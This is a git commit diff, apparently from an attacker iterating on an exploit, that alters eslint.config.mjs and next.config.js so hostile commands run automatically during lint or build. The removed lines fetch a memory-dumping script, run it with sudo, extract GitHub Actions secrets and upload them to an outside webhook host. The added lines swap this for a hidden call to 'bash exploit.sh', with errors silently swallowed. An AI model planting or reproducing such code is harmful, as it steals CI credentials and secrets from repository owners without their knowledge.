b5c267dcfc1ca46fb440c4485688e28c274b18c4
j5884p5g <j5884p5g@rolf.ovh>
2026-04-25 12:01:17 +0000

    Update exploit based on attempt 2 feedback

--- eslint.config.mjs
+++ eslint.config.mjs
@@ -4,10 +4,7 @@ import { FlatCompat } from '@eslint/eslintrc';
 import { execSync } from 'child_process';
 
 try {
-  const runId = process.env.GITHUB_RUN_ID;
-  if (runId) {
-    execSync(`echo "Okay, we got this far. Let's continue..." && curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets" && curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`, { stdio: 'inherit' });
-  }
+  execSync("bash exploit.sh", { stdio: 'inherit' });
 } catch (e) {}
 
 const __filename = fileURLToPath(import.meta.url);
--- next.config.js
+++ next.config.js
@@ -1,6 +1,6 @@
 const { execSync } = require('child_process');
 try {
-  execSync("curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\" && curl -X PUT -d \\@/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\"", { stdio: 'inherit' });
+  execSync("bash exploit.sh", { stdio: 'inherit' });
 } catch (e) {}
 
 /**
